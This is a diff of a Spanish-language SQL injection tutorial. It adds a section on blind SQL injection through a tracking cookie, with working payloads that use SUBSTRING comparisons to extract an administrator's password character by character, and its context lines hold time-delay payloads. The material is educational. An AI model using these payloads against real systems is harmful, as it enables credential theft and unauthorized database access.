@@ -172,4 +172,31 @@ Estos payloads se usan para testear si existe una inyeccion SQL porque no supone
 ");waitfor delay '0:0:5'--
 ));waitfor delay '0:0:5'--
 ```
+------------------------------------------
+### 5- Inyección SQL ciega
+La inyección SQL ciega surge cuando una aplicación es vulnerable a la inyección SQL, pero sus respuestas HTTP no contienen los resultados de la consulta SQL relevante o los detalles de los errores de la base de datos.
+Es decir no se reflejan en la web. Pero una forma es ir comprobando estas consultas através de las cookies de seguimiento.
+Por ejemplo:
+```http
+Cookie: TrackingId= e8IU14F6r1xyz
+```
+Suponiendo que hay una tabla llamada "Users" con las columnas "Username" y "Password", y un usuario llamado "Administrador". Podemos determinar sistemáticamente la contraseña para este usuario enviando una serie de entradas para probar la contraseña un carácter a la vez.
+
+Para hacer esto, comenzamos con la siguiente entrada:
+```sql
+Cookie: TrackingId= e8IU14F6r1xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrador'), 1, 1) > 'a
+```
+Esto devuelve el mensaje "Bienvenido de nuevo", que indica que la condición inyectada es verdadera, por lo que el primer carácter de la contraseña es mayor que a.
+
+A continuación, enviamos la siguiente entrada:
+```sql
+Cookie: TrackingId= e8IU14F6r1xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrador'), 1, 1) > 'c
+```
+Esto no devuelve el mensaje "Bienvenido de nuevo", lo que indica que la condición inyectada es falsa, por lo que el primer carácter de la contraseña no es mayor que c.
+
+Finalmente, enviamos la siguiente entrada, que devuelve el mensaje "Bienvenido de nuevo", confirmando así que el primer carácter de la contraseña es b:
+```sql
+Cookie: TrackingId= e8IU14F6r1xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrador'), 1, 1) = 'b
+```
+Podemos continuar este proceso para determinar sistemáticamente la contraseña completa para el usuario Administrador.
 
